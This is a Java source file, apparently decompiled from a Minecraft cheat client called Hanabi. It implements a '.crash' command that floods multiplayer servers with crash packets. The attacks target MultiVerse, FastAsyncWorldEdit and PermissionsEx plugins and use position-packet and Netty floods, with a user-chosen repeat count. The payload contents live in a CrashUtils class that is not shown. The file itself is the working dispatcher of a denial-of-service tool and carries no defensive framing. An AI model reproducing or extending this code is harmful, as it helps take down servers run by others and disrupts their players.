package cn.hanabi.command.commands;

import cn.hanabi.Hanabi;
import cn.hanabi.Wrapper;
import cn.hanabi.command.Command;
import cn.hanabi.gui.notifications.Notification;
import cn.hanabi.utils.ClientUtil;
import cn.hanabi.utils.PlayerUtil;
import cn.hanabi.utils.crasher.CrashUtils;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import net.minecraft.network.play.client.C01PacketChatMessage;
import org.jetbrains.annotations.NotNull;

public class CrashCommand extends Command {
   public static String[] crashType = new String[]{"MV", "Fawe", "Pex", "Position", "Rsc1", "Rsc2", "Netty"};
   CrashUtils crashUtils = new CrashUtils();

   public CrashCommand() {
      super("crash");
   }

   public void run(String alias, @NotNull String[] args) {
      if (args.length < 1) {
         ClientUtil.sendClientMessage("Usage: ." + alias + " method_name/list <amount> delay(ms)", Notification.Type.INFO);
      } else {
         int amounts = 5;
         String CrashType = args[0];
         if (args.length > 1) {
            amounts = Integer.parseInt(args[1]);
         }

         int value = amounts;
         if (mc.isSingleplayer()) {
            ClientUtil.sendClientMessage("Not Support", Notification.Type.ERROR);
         } else {
            try {
               Hanabi.INSTANCE.packetQueue.clear();
               Hanabi.INSTANCE.timing = 0L;
               switch (CrashType.toLowerCase()) {
                  case "pex":
                     Wrapper.sendPacketNoEvent(new C01PacketChatMessage(this.crashUtils.pexcrashexp1));
                     Wrapper.sendPacketNoEvent(new C01PacketChatMessage(this.crashUtils.pexcrashexp2));
                     break;
                  case "fawe":
                     Wrapper.sendPacketNoEvent(new C01PacketChatMessage(this.crashUtils.fawe));
                     break;
                  case "mv":
                     Wrapper.sendPacketNoEvent(new C01PacketChatMessage(this.crashUtils.mv));
                     break;
                  case "position":
                     this.crashUtils.custombyte(value);
                  case "rsc1":
                  case "rsc2":
                     break;
                  case "netty":
                     this.crashUtils.crashdemo("a", 0, 1500, 5, false, CrashUtils.CrashType.PLACE, amounts);
                     break;
                  case "list":
                     PlayerUtil.tellPlayer(Arrays.toString(crashType));
                     break;
                  default:
                     PlayerUtil.tellPlayer("Couldn't Find the Crash Type");
               }

               ClientUtil.sendClientMessage("Success Added Methods to Queue " + CrashType, Notification.Type.INFO);
            } catch (Throwable var8) {
               var8.printStackTrace();
               ClientUtil.sendClientMessage("Got a error When you do " + CrashType, Notification.Type.ERROR);
            }
         }

      }
   }

   public List autocomplete(int arg, String[] args) {
      String prefix = "";
      boolean flag = false;

      try {
         if (arg == 0) {
            flag = true;
         } else if (arg == 1) {
            flag = true;
         }
      } catch (Exception var6) {
      }

      ArrayList crashtype = new ArrayList(Arrays.asList(crashType));
      return flag ? crashtype : new ArrayList();
   }
}
